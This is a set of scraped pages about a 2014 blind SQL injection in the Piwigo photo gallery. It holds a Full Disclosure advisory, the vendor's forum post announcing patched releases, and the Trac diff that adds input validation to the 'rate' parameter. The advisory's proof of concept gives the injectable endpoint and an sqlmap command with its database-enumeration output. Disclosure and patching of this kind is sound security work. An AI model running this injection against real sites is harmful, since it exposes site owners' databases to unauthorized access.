=== Content from seclists.org_cb186e14_20250124_194909.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

![](/shared/images/nst-icons.svg#search)

# Piwigo <= v2.6.0 - Blind SQL Injection

---

*From*: Manuel Garcia Cardenas <advidsec () gmail com>

*Date*: Wed, 12 Nov 2014 09:56:22 +0100

---

```
=============================================
MGC ALERT 2014-001
- Original release date: January 12, 2014
- Last revised:  November 12, 2014
- Discovered by: Manuel Garc√≠a C√°rdenas
- Severity: 7,1/10 (CVSS Base Score)
=============================================

I. VULNERABILITY
-------------------------
Blind SQL Injection in Piwigo <= v2.6.0

II. BACKGROUND
-------------------------
Piwigo is a web application management photo albums, available under the
License GPL. Is written in PHP and requires a MySQL, PostgreSQL or SQLite
data.

III. DESCRIPTION
-------------------------
This bug was found using the portal without authentication. To exploit the
vulnerability only is needed use the version 1.0 of the HTTP protocol to
interact with the application. It is possible to inject SQL code in the
variable "rate" on the page "picture.php".

IV. PROOF OF CONCEPT
-------------------------
The following URL's and parameters have been confirmed to all suffer from
Blind SQL injection.

/piwigo/picture.php?/1/category/1&action=rate (POST parameter: rate=1)

Exploiting with SQLMap:

python sqlmap.py -u "
<http://192.168.244.129/piwigo/picture.php?/1/category/1&action=rate">; --data
"rate=1" --dbs

[16:32:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
web application technology: PHP 5.3.2, Apache 2.2.14
back-end DBMS: MySQL 5
[16:32:25] [INFO] fetching database names
[16:32:25] [INFO] fetching number of databases
[16:32:25] [INFO] resumed: 4
[16:32:25] [INFO] resumed: information_schema
[16:32:25] [INFO] resumed: mysql
[16:32:25] [INFO] resumed: phpmyadmin
[16:32:25] [INFO] resumed: piwigo
available databases [4]:
[*] information_schema
[*] mysql
[*] phpmyadmin
[*] piwigo

V. BUSINESS IMPACT
-------------------------
Public defacement, confidential data leakage, and database server
compromise can result from these attacks. Client systems can also be
targeted, and complete compromise of these client systems is also possible.

VI. SYSTEMS AFFECTED
-------------------------
Piwigo <= v2.6.0

VII. SOLUTION
-------------------------
All data received by the application and can be modified by the user,
before making any kind of transaction with them must be validated.

VIII. REFERENCES
-------------------------
<http://www.piwigo.org>

IX. CREDITS
-------------------------
This vulnerability has been discovered and reported
by Manuel Garc√≠a C√°rdenas (advidsec (at) gmail (dot) com).

X. REVISION HISTORY
-------------------------
January 21, 2014 1: Initial release

XI. DISCLOSURE TIMELINE
-------------------------
January 21, 2014 1: Vulnerability acquired by Manuel Garcia Cardenas
November 12, 2014 2: Send to the Full-Disclosure lists

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.

XIII. ABOUT
-------------------------
Manuel Garcia Cardenas
Pentester

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

### Current thread:

* **Piwigo <= v2.6.0 - Blind SQL Injection** *Manuel Garcia Cardenas (Nov 12)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from piwigo.org_ba22f3f6_20250124_194908.html ===


# [Piwigo Logo](https://piwigo.org "Go back to homepage")

* [Home](https://piwigo.org "Where everything starts")
* [Docs](https://piwigo.org/doc/ "Read and search online documentation")
* [Forums](https://piwigo.org/forum/ "Any problems getting Piwigo to run?")
* [News](https://piwigo.org/news/ "Read Latest News")
* [Extensions](https://piwigo.org/ext/ "Plugins, Themes, Tools")
* [Hosting](https://piwigo.org/hosting/ "Find a web host for your Piwigo gallery")

üåç
English

Change Language

* [Brasil](https://br.piwigo.org/forum/)
* [Dansk](https://da.piwigo.org/forum/)
* [Deutsch](https://de.piwigo.org/forum/)
* [English](https://piwigo.org/forum/)
* [Espa√±ol](https://es.piwigo.org/forum/)
* [Fran√ßais](https://fr.piwigo.org/forum/)
* [Italiano](https://it.piwigo.org/forum/)
* [Nederlands](https://nl.piwigo.org/forum/)
* [Polski](https://pl.piwigo.org/forum/)
* [T√ºrk√ße](https://tr.piwigo.org/forum/)
* [–†—É—Å—Å–∫–∏–π](https://ru.piwigo.org/forum/)
* [ÁÆÄ‰Ωì‰∏≠Êñá](https://cn.piwigo.org/forum/)

# Piwigo.org

* [Forum Index](index.php)
* [Tags](tags.php)
* [Timeline](timeline.php)
* [User list](userlist.php)
* [Rules](misc.php?action=rules)
* [Search](search.php)

[Register](register.php) [Login](login.php)

## Announcement

* [2024-12-20] [Piwigo 15.3.0 : same as 15.2.0 but compatible with PHP 7](viewtopic.php?id=34069)
* [2024-12-19] [Piwigo 15.2.0 : better user activation and many fixes](viewtopic.php?id=34066)
* [2024-11-11] [Piwigo 15.1.0 : small fixes and what's new popup](viewtopic.php?id=33997)
* [2024-10-22] [Piwigo 15](viewtopic.php?id=33938)
* [2024-09-23] [Piwigo 15.0.0RC1, almost there](viewtopic.php?id=33892)

[Post reply](post.php?tid=24850)

Pages: **1**

* ¬ª¬†[Announcements](viewforum.php?id=23)
* ¬ª¬†Piwigo 2.7.2, 2.6.4, 2.5.5, security bug fixed

## #1¬†[2014-11-21 15:15:11](viewtopic.php?pid=156284#p156284)

**[plg](profile.php?id=2)**
![](img/avatars/2.jpg)
Piwigo Team
Nantes, France, Europe
2002-04-05
13884

### Piwigo 2.7.2, 2.6.4, 2.5.5, security bug fixed

Hi Piwigo users,

A major security issue, reported by [xd\_xd](http://stayliv3.github.io/), has been fixed and we have released 3 new versions of Piwigo. Piwigo 2.5.5 and 2.6.4 only contain the security fix and 2.7.2 brings a few bug fixes as well, see [Piwigo 2.7.2 Release Notes](http://piwigo.org/releases/2.7.2).

We strongly encourage you to update your Piwigo immediately! Follow the [automatic upgrade procedure](http://piwigo.org/basics/upgrade_automatic)

Offline

* [Quote](post.php?tid=24850&qid=156284)

## #2¬†[2014-11-24 21:26:32](viewtopic.php?pid=156349#p156349)

**Glyn Hudson**

Guest

### Re: Piwigo 2.7.2, 2.6.4, 2.5.5, security bug fixed

Hi,

I'm running 2.7.1, when I try to auto update to 2.7.2 I get lots of 'write protected' errors. What am I doing wrong? Sorry, I'm sure it's something basic I'm missing!

Here is my log:

picture.php: write\_protected
admin/cat\_modify.php: write\_protected
admin/user\_list.php: write\_protected
admin/include/plugins.class.php: write\_protected
admin/include/functions.php: write\_protected
admin/themes/default/js/datepicker.js: write\_protected
admin/themes/default/template/photos\_add\_direct.tpl: write\_protected
admin/batch\_manager.php: write\_protected
index.php: write\_protected
include/functions\_plugins.inc.php: write\_protected
include/php\_compat/gzopen.php: write\_protected
include/ws\_functions/pwg.extensions.php: write\_protected
include/ws\_functions/pwg.images.php: write\_protected
include/functions\_search.inc.php: write\_protected
include/functions\_rate.inc.php: write\_protected
include/common.inc.php: write\_protected
include/constants.php: write\_protected
themes/elegant/themeconf.inc.php: write\_protected
themes/elegant/language/et\_EE/theme.lang.php: write\_protected
themes/elegant/language/ja\_JP/theme.lang.php: write\_protected
themes/elegant/language/de\_DE/theme.lang.php: write\_protected
themes/elegant/language/gl\_ES/: path\_creation\_fail
themes/elegant/language/gl\_ES/theme.lang.php: path\_creation\_fail
themes/smartpocket/js/code.photoswipe.min.js: write\_protected
themes/smartpocket/js/code.photoswipe.jquery.min.js: write\_protected
themes/smartpocket/theme.css: write\_protected
themes/smartpocket/themeconf.inc.php: write\_protected
themes/smartpocket/language/ja\_JP/: path\_creation\_fail
themes/smartpocket/language/ja\_JP/index.php: path\_creation\_fail
themes/smartpocket/language/ja\_JP/theme.lang.php: path\_creation\_fail
themes/smartpocket/language/ar\_SA/: path\_creation\_fail
themes/smartpocket/language/ar\_SA/index.php: path\_creation\_fail
themes/smartpocket/language/ar\_SA/theme.lang.php: path\_creation\_fail
themes/smartpocket/language/gl\_ES/: path\_creation\_fail
themes/smartpocket/language/gl\_ES/index.php: path\_creation\_fail
themes/smartpocket/language/gl\_ES/theme.lang.php: path\_creation\_fail
themes/smartpocket/language/th\_TH/: path\_creation\_fail
themes/smartpocket/language/th\_TH/index.php: path\_creation\_fail
themes/smartpocket/language/th\_TH/theme.lang.php: path\_creation\_fail
language/ja\_JP/admin.lang.php: write\_protected
language/ja\_JP/common.lang.php: write\_protected
language/ja\_JP/help/help\_groups.html: write\_protected
language/ja\_JP/help/search.html: write\_protected
language/ja\_JP/help/synchronize.html: write\_protected
language/ja\_JP/help/help\_permissions.html: write\_protected
language/ja\_JP/help/cat\_move.html: write\_protected
language/ja\_JP/help/cat\_modify.html: write\_protected
language/ja\_JP/help/help\_virtual\_links.html: write\_protected
language/ja\_JP/help/maintenance.html: write\_protected
language/ja\_JP/help/configuration.html: write\_protected
language/ja\_JP/help/cat\_perm.html: write\_protected
language/ja\_JP/help/photos\_add\_ftp.html: write\_protected
language/ja\_JP/help/cat\_options.html: write\_protected
language/ja\_JP/help/permalinks.html: write\_protected
language/de\_DE/admin.lang.php: write\_protected
language/de\_DE/common.lang.php: write\_protected
language/da\_DK/admin.lang.php: write\_protected
language/da\_DK/common.lang.php: write\_protected
language/nb\_NO/admin.lang.php: write\_protected
language/nb\_NO/common.lang.php: write\_protected
language/sr\_RS/common.lang.php: write\_protected
language/fa\_IR/admin.lang.php: write\_protected
language/fa\_IR/common.lang.php: write\_protected
language/hu\_HU/admin.lang.php: write\_protected
language/hu\_HU/common.lang.php: write\_protected
language/pt\_BR/admin.lang.php: write\_protected
language/pt\_BR/common.lang.php: write\_protected
language/sv\_SE/common.lang.php: write\_protected
language/gl\_ES/admin.lang.php: write\_protected
language/gl\_ES/common.lang.php: write\_protected
language/gl\_ES/help/search.html: write\_error
language/gl\_ES/help/synchronize.html: write\_error
language/gl\_ES/help/user\_list.html: write\_error
language/gl\_ES/help/maintenance.html: write\_error
language/gl\_ES/help/photos\_add\_ftp.html: write\_error
language/gl\_ES/help/notification\_by\_mail.html: write\_error
language/gl\_ES/help/permalinks.html: write\_error
language/mn\_MN/common.lang.php: write\_protected
language/ru\_RU/admin.lang.php: write\_protected
language/ru\_RU/common.lang.php: write\_protected
language/th\_TH/admin.lang.php: write\_protected
language/th\_TH/common.lang.php: write\_protected
language/nl\_NL/common.lang.php: write\_protected
language/pt\_PT/admin.lang.php: write\_protected
language/pt\_PT/common.lang.php: write\_protected
language/en\_UK/admin.lang.php: write\_protected
language/en\_UK/common.lang.php: write\_protected

* [Quote](post.php?tid=24850&qid=156349)

## #3¬†[2014-11-25 00:01:43](viewtopic.php?pid=156352#p156352)

**[flop25](profile.php?id=2312)**
![](img/avatars/2312.jpg)
Piwigo Team
2006-07-06
7037

### Re: Piwigo 2.7.2, 2.6.4, 2.5.5, security bug fixed

Hello
1) please open a new thread
2) before that check chmod and owner of the files and folders
3)for minor release you cans imply overwrite files

---

To get a better help : Politeness like Hello-A link-Your past actions precisely described
[Check my extensions : more than 30 available](http://bit.ly/vT4fAI)
who I am and what I do : <http://fr.gravatar.com/flop25>
[My gallery](http://www.planete-flop.fr/gallerie) : an illustration of how to integrate Piwigo in your website

Offline

* [Quote](post.php?tid=24850&qid=156352)

Pages: **1**

* ¬ª¬†[Announcements](viewforum.php?id=23)
* ¬ª¬†Piwigo 2.7.2, 2.6.4, 2.5.5, security bug fixed

[Post reply](post.php?tid=24850)

## Board footer

Powered by [FluxBB](http://fluxbb.org/)

[github](https://github.com/Piwigo)
[twitter](http://twitter.com/piwigo)

[newsletter](/basics/newsletter)
[Donate](https://piwigo.org/get-involved#donate)

Piwigo.org ¬© 2002-2025 ¬∑ [Contact](/contact)



=== Content from piwigo.org_85179fd6_20250124_194907.html ===

[![Piwigo logo](https://fr.piwigo.org/plugins/piwigo-piwigodotorg/images/piwigo.org.svg)](http://piwigo.org/dev)

Search:

* [Timeline](/dev/timeline)
* [Browse Source](/dev/browser)
* [Search](/dev/search)

## Context Navigation

* ‚Üê [Previous Change](/dev/changeset/28587/trunk/include/functions_rate.inc.php "Changeset 28587 for trunk/include/functions_rate.inc.php")
* [Next Change](/dev/changeset/31259 "Changeset 31259 for trunk/include/functions_rate.inc.php") ‚Üí

---

# Changeset [30563](/dev/changeset/30563 "Show full changeset") for [trunk/include/functions\_rate.inc.php](/dev/browser/trunk/include/functions_rate.inc.php?rev=30563 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
Nov 21, 2014, 1:17:18 PM
([10 years](/dev/timeline?from=2014-11-21T13%3A17%3A18%2B01%3A00&precision=second "See timeline at Nov 21, 2014, 1:17:18 PM") ago)

Author:
plg
Message:

bug 3178 fixed, in\_array check is not reliable when you compare string (user input) and numeric values

File:

1 edited

* [trunk/include/functions\_rate.inc.php](/dev/browser/trunk/include/functions_rate.inc.php?rev=30563 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [trunk/include/functions\_rate.inc.php](/dev/changeset/30563/trunk/include/functions_rate.inc.php "Show the changeset 30563 restricted to trunk/include/functions_rate.inc.php")

  | [r28587](/dev/browser/trunk/include/functions_rate.inc.php?rev=28587#L40 "Show revision 28587 of this file in browser") | [r30563](/dev/browser/trunk/include/functions_rate.inc.php?rev=30563#L40 "Show revision 30563 of this file in browser") |  |
  | --- | --- | --- |
  | 40 | 40 | if (!isset($rate) |
  | 41 | 41 | or !$conf['rate'] |
  |  | 42 | or !preg\_match('/^[0-9]+$/', $rate) |
  | 42 | 43 | or !in\_array($rate, $conf['rate\_items'])) |
  | 43 | 44 | { |

**Note:** See [TracChangeset](/dev/wiki/TracChangeset)
for help on using the changeset viewer.

### Download in other formats:

* [Unified Diff](?format=diff&new=30563)
* [Zip Archive](?format=zip&new=30563)

---

[![Trac Powered](/dev/chrome/common/trac_logo_mini.png)](http://trac.edgewall.org/)

Powered by [**Trac 1.2.3**](/dev/about)

By [Edgewall Software](http://www.edgewall.org/).

Visit the Trac open source project at
<http://trac.edgewall.org/>


